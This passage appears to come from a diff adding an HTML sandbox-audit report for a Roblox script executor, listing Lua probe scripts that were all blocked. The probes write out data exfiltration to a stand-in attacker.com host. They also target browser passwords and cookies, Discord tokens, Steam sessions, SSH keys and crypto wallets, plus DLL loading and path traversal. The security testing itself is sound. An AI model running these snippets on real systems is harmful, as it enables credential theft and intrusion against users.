+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>File System: UNC Path Bypass</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p59',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p59'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "File System: UNC Path Bypass",
+    callback = function()
+        if not writefile then return "writefile not supported" end
+        local p = "\\\\127.0.0.1\\C$\\vuln_test.txt"
+        local ok = pcall(function() writefile(p,"test") end)
+        if ok then pcall(delfile,p); error("Filesystem sandbox escaped via UNC Path") end
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Network: file:// Protocol Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p60',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p60'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Network: file:// Protocol Access",
+    callback = function()
+        local ok, result = pcall(function()
+            return game:HttpGet("file:///C:/Windows/System32/drivers/etc/hosts")
+        end)
+        if ok and type(result)=="string" and #result&gt;0 then
+            error("file:// protocol readable")
+        end
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>System: Console Spam/Freeze</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>WARNING: Allowed setting massive console title</td><td><button class='vbtn vbtn-pass' onclick="toggle('p61',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p61'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: WARNING: Allowed setting massive console title
+
+-- Probe source that was blocked:
+{
+    name = "System: Console Spam/Freeze",
+    callback = function()
+        if not rconsoleprint then return "rconsole not supported" end
+        if rconsolename then
+            local ok = pcall(function() rconsolename(string.rep("A",10000)) end)
+            if ok then return "WARNING: Allowed setting massive console title" end
+        end
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>System: FFI Exposure</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p62',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p62'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "System: FFI Exposure",
+    callback = function()
+        local has_ffi = false
+        pcall(function() if ffi then has_ffi = true end end)
+        pcall(function()
+            if package and package.loaded and package.loaded.ffi then has_ffi = true end
+        end)
+        if has_ffi then error("CRITICAL: FFI Library is exposed!") end
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Process Injection Attempt</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p66',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p66'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Process Injection Attempt",
+    callback = function()
+        local _, err = pcall(function()
+            local h = io.popen("tasklist")
+            if h then h:read("*a"); h:close() end
+        end)
+        assert(err, "Process enumeration capability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>DLL Injection Test</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p67',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p67'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "DLL Injection Test",
+    callback = function()
+        if not loadstring then return "Executor does not support function" end
+        local _, err = pcall(function()
+            local ffi = require("ffi")
+            ffi.cdef("void* LoadLibraryA(const char* lpFileName);")
+            ffi.C.LoadLibraryA("malicious.dll")
+        end)
+        assert(err, "DLL loading capability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Data Exfiltration Test</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p68',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p68'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Data Exfiltration Test",
+    callback = function()
+        if not readfile or not request then return "Executor does not support function" end
+        local _, err = pcall(function()
+            local data = readfile("workspace/sensitive.txt")
+            request({ Url="http://attacker.com/steal", Method="POST", Body=data })
+        end)
+        assert(err, "File exfiltration capability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Environment Variable Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p69',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p69'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Environment Variable Access",
+    callback = function()
+        local _, err = pcall(function()
+            local _ = os.getenv("USERNAME")
+            local _ = os.getenv("COMPUTERNAME")
+            local _ = os.getenv("USERPROFILE")
+            local _ = os.getenv("TEMP")
+        end)
+        assert(err, "Environment variable access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Hidden File Creation</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p75',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p75'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Hidden File Creation",
+    callback = function()
+        if not writefile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            writefile("hidden.exe","backdoor")
+            if os.execute then os.execute("attrib +h +s hidden.exe") end
+        end)
+        assert(err, "Hidden file capability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Chrome Password Theft</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p77',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p77'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Chrome Password Theft",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile(os.getenv("LOCALAPPDATA").."\\Google\\Chrome\\User Data\\Default\\Login Data")
+        end)
+        assert(err, "Browser password database accessible")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Discord Token Extraction</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p78',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p78'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Discord Token Extraction",
+    callback = function()
+        if not readfile or not listfiles then return "Executor does not support function" end
+        local _, err = pcall(function()
+            listfiles(os.getenv("APPDATA").."\\discord\\Local Storage\\leveldb")
+            listfiles(os.getenv("APPDATA").."\\discordcanary\\Local Storage\\leveldb")
+        end)
+        assert(err, "Discord token access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Steam Session Hijacking</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p79',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p79'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Steam Session Hijacking",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")
+        end)
+        assert(err, "Steam session data accessible")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>SSH Key Theft</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p82',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p82'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "SSH Key Theft",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile(os.getenv("USERPROFILE").."\\.ssh\\id_rsa")
+        end)
+        assert(err, "SSH private key accessible")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Browser Cookie Extraction</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p83',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p83'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Browser Cookie Extraction",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile(os.getenv("LOCALAPPDATA").."\\Google\\Chrome\\User Data\\Default\\Cookies")
+            readfile(os.getenv("LOCALAPPDATA").."\\Microsoft\\Edge\\User Data\\Default\\Cookies")
+            readfile(os.getenv("LOCALAPPDATA").."\\Mozilla\\Firefox\\Profiles")
+        end)
+        assert(err, "Browser cookies accessible")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Cryptocurrency Wallet Theft</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p84',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p84'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Cryptocurrency Wallet Theft",
+    callback = function()
+        if not readfile or not listfiles then return "Executor does not support function" end
+        local _, err = pcall(function()
+            listfiles(os.getenv("APPDATA").."\\Ethereum\\keystore")
+            listfiles(os.getenv("APPDATA").."\\Bitcoin\\wallet.dat")
+        end)
+        assert(err, "Crypto wallet access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Module Script Injection</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p85',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p85'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Module Script Injection",
+    callback = function()
+        local _, err = pcall(function()
+            if loadstring then
+                local m = loadstring("return setfenv(function() end, getfenv(0))()")
+                if m then error("Module injection possible") end
+            end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>CoreGui Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p86',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p86'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "CoreGui Access",
+    callback = function()
+        local _, err = pcall(function()
+            local rg = game:GetService("CoreGui"):FindFirstChild("RobloxGui")
+            if rg then error("CoreGui manipulation possible") end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Plugin Security Bypass</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p87',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p87'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Plugin Security Bypass",
+    callback = function()
+        local _, err = pcall(function()
+            if plugin then error("Plugin context accessible") end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Require Hijacking</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p88',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p88'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Require Hijacking",
+    callback = function()
+        local _, err = pcall(function()
+            if hookfunction then
+                hookfunction(require, function()
+                    return function() error("Require hijacked") end
+                end)
+                error("Require function hookable")
+            end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Metatable Protection Bypass</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p89',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p89'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Metatable Protection Bypass",
+    callback = function()
+        local _, err = pcall(function()
+            local protected = setmetatable({}, {__metatable = "Protected"})
+            if getrawmetatable then
+                local mt = getrawmetatable(protected)
+                if mt then error("Metatable protection bypassed") end
+            end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Memory Dump Capability</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p93',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p93'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Memory Dump Capability",
+    callback = function()
+        local _, err = pcall(function()
+            if readfile and writefile then
+                local gc = getgc and getgc(true) or {}
+                if #gc &gt; 10000 then error("Memory enumeration possible") end
+            end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Stack Trace Manipulation</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p97',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p97'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Stack Trace Manipulation",
+    callback = function()
+        local _, err = pcall(function()
+            if debug and debug.traceback then
+                local _ = debug.traceback()
+                if setstack then error("Stack manipulation possible") end
+            end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Heap Spray Detection</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p98',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p98'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Heap Spray Detection",
+    callback = function()
+        local _, err = pcall(function()
+            local spray = {}
+            for i = 1, 100000 do spray[i] = string.rep("A", 1000) end
+            if #spray &gt; 50000 then return "WARNING: Unrestricted memory allocation" end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Temp Folder Write Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p99',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p99'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Temp Folder Write Access",
+    callback = function()
+        if not writefile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            writefile(os.getenv("TEMP").."\\malware.exe","test")
+        end)
+        assert(err, "Unrestricted temp folder access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>AppData Roaming Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p100',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p100'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "AppData Roaming Access",
+    callback = function()
+        if not listfiles then return "Executor does not support function" end
+        local _, err = pcall(function() listfiles(os.getenv("APPDATA")) end)
+        assert(err, "AppData enumeration")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Desktop File Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p101',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p101'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Desktop File Access",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            listfiles(os.getenv("USERPROFILE").."\\Desktop")
+        end)
+        assert(err, "Desktop folder access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Downloads Folder Enumeration</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p102',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p102'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Downloads Folder Enumeration",
+    callback = function()
+        if not listfiles then return "Executor does not support function" end
+        local _, err = pcall(function()
+            listfiles(os.getenv("USERPROFILE").."\\Downloads")
+        end)
+        assert(err, "Downloads folder access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Documents Folder Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p103',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p103'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Documents Folder Access",
+    callback = function()
+        if not listfiles then return "Executor does not support function" end
+        local _, err = pcall(function()
+            listfiles(os.getenv("USERPROFILE").."\\Documents")
+        end)
+        assert(err, "Documents folder access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>File Extension Spoofing</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p104',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p104'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "File Extension Spoofing",
+    callback = function()
+        if not writefile then return "Executor does not support function" end
+        local _, err = pcall(function() writefile("innocent.txt.exe","malware") end)
+        assert(err, "Executable extension allowed")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Path Traversal (Relative)</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p106',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p106'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Path Traversal (Relative)",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile("../../../Windows/System32/drivers/etc/hosts")
+        end)
+        assert(err, "Relative path traversal")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>File Overwrite Protection</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p108',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p108'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "File Overwrite Protection",
+    callback = function()
+        if not writefile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            writefile("C:\\Windows\\System32\\important.dll","overwritten")
+        end)
+        assert(err, "System file overwrite possible")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>WebSocket Connection</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p111',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p111'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "WebSocket Connection",
+    callback = function()
+        local _, err = pcall(function()
+            if WebSocket then
+                WebSocket.connect("ws://attacker.com")
+                error("WebSocket available")
+            end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>FTP Connection Attempt</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p112',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p112'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "FTP Connection Attempt",
+    callback = function()
+        if not request then return "Executor does not support function" end
+        local _, err = pcall(function()
+            request({Url="ftp://malicious-ftp.com",Method="GET"})
+        end)
+        assert(err, "FTP protocol access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>IP Geolocation Leak</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>WARNING: IP geolocation accessible</td><td><button class='vbtn vbtn-pass' onclick="toggle('p113',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p113'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: WARNING: IP geolocation accessible
+
+-- Probe source that was blocked:
+{
+    name = "IP Geolocation Leak",
+    callback = function()
+        if not request then return "Executor does not support function" end
+        local ok, result = pcall(function()
+            local resp = request({Url="https://ipapi.co/json/"})
+            if resp and resp.Body then
+                return game:GetService("HttpService"):JSONDecode(resp.Body)
+            end
+        end)
+        if ok and result then return "WARNING: IP geolocation accessible" end
+    end,
+},</pre></td></tr>      </tbody>
+    </table>
+  </div>
+</section>
+
+<section class="sec" id="functions">
